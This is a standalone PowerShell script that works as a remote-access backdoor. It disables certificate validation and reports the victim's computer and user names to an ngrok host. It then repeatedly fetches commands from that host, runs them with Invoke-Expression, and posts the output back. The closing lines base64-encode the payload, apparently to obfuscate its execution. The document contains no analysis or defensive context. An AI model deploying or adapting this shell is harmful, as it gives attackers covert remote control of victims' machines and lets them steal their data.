$Text = ‘add-type @"
using System.Net;using System.Security.Cryptography.X509Certificates;
public class TrustAllCertsPolicy : ICertificatePolicy {public bool CheckValidationResult(
ServicePoint srvPoint, X509Certificate certificate,WebRequest request, int certificateProblem) {return true;}}
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
$ConfirmPreference="None";$s='3359-41-66-127-252.ngrok-free.app';$i='3365cd-a6425a-1beaec';$p='https://';$v=Invoke-RestMethod -UseBasicParsing -Uri $p$s/3365cd/$env:COMPUTERNAME/$env:USERNAME -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"};for (;;){$c=(Invoke-RestMethod -UseBasicParsing -Uri $p$s/a6425a -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"});if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$x=Invoke-RestMethod -Uri $p$s/1beaec -Method POST -Headers @{"Authorization"=$i;"ngrok-skip-browser-warning"="asd"} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
